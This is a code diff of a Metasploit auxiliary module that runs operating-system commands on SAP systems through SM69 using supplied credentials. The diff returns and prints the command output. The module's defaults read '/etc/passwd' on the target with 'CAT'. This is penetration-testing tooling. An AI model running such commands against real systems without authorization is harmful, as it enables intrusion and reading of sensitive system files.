@@ -37,7 +37,7 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
         OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
-        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
+        OptEnum.new('OS', [true, 'SM69 Target OS','UNIX',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
       ], self.class)
   end
 
@@ -51,7 +51,12 @@ class Metasploit4 < Msf::Auxiliary
 
     os = datastore['OS']
 
-    exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'], datastore['CMD'], datastore['PARAM'], os)
+    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'], datastore['CMD'], datastore['PARAM'], os)
+    if res.blank?
+      print_error("#{rhost}:#{rport} [SAP] No output returned")
+    else
+      print res
+    end
   end
 
   def exec_CMD(user, client, pass, rhost, rport, cmd, param, os)
@@ -65,7 +70,7 @@ class Metasploit4 < Msf::Auxiliary
                     :OPERATINGSYSTEM => os,
                     :ADDITIONAL_PARAMETERS => param
                   })
-        print data
+        return data
       rescue NWError => e
         print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
